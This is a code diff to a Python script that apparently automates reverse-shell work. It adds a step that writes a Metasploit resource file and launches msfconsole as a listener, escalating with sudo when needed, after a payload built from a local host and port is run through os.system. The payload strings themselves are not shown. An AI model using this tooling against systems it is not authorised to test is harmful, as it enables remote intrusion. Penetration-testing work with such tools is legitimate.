@@ -199,11 +199,14 @@ def step4():
             print("[+]Valid number range: 1~17")
             print(bcolors.ENDC)
     del allow_array
+    
+    cmd_number = int(cmd_number) - 1
+
     return cmd_number
 
 def step5(lhost,selected_port,cmd_number,host_info):
 
-     cmd_number = int(cmd_number) - 1
+     #cmd_number = int(cmd_number) - 1
 
      generated_payload = armoury.payload_gen(lhost,selected_port,cmd_number)
      
@@ -236,6 +239,22 @@ def step5(lhost,selected_port,cmd_number,host_info):
 
      os.system(generated_payload)
 
+def step6(lhost,selected_port,cmd_number):
+
+    set_payload = armoury.payload_setter(cmd_number)
+    file_name = armoury.listener_config(lhost,selected_port,set_payload)
+    
+    if os.getuid() != 0:
+
+        cmd = f"sudo msfconsole -r {file_name}"
+    
+    else:
+
+        cmd = f"msfconsole -r {file_name}"
+
+    os.system(cmd)
+    #os.system(f"rm {file_name}")
+
 if __name__ == "__main__":
 
     init()
@@ -245,3 +264,4 @@ if __name__ == "__main__":
     host_info = step3(lhost,selected_port)
     cmd_number = step4()
     step5(lhost,selected_port,cmd_number,host_info)    
+    step6(lhost,selected_port,cmd_number)
